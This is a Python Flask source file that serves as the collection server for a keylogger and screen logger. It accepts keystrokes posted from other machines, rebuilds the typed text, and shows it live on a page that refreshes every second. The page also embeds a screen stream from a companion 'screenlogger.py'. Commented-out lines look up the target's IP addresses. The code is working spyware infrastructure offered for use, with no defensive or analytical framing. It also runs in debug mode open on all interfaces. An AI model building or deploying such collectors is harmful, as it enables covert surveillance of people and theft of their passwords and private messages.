from flask import Flask, render_template_string, request

# Get the user's address
# ip = geocoder.ip("me")
# # Get the user's public IP address
# myip = socket.gethostbyname(socket.gethostname())
# print(f"This is my public IP: {myip}")
#
# # Get the user's private IP address
# print(f"This is my private IP: {ip.ip}")
#

app = Flask(__name__)

# Global variable to hold the keystrokes received
keystrokes = []

# Main page
# HTML template for the live display
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{myip}}</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        #keystrokes { white-space: pre-wrap; word-wrap: break-word; border: 1px solid #ccc; padding: 10px; }
    </style>
</head>
<body>
    <h1>{{myip}}</h1>
    <div id="keystrokes">{{ keystrokes }}</div>
    <h1>Live Screen Streaming</h1>
    <img src="HTTP:<IP_ADDRESS>:3000/video_feed" width="800">
    <script>
        const fetchKeystrokes = async () => {
            const response = await fetch('/get_keystrokes');
            const text = await response.text();
            document.getElementById('keystrokes').innerText = text;
        };
        setInterval(fetchKeystrokes, 1000); // Refresh every second
    </script>
</body>
</html>
"""


# Route to serve the live stream from screenlogger.py

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, keystrokes="")


@app.route("/keystrokes", methods=['POST'])
def receive_keystrokes():
    global keystrokes
    data = request.get_json()
    if data and "key" in data:
        key = data["key"]
        if key == "backspace":
            if keystrokes:
                keystrokes.pop()  # Remove the last character
        else:
            keystrokes.append(data['key'])
    return "Keystroke received", 200


@app.route('/get_keystrokes', methods=['GET'])
def get_keystrokes():
    # Return all the keystrokes as a single string
    return "".join(keystrokes), 200


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)
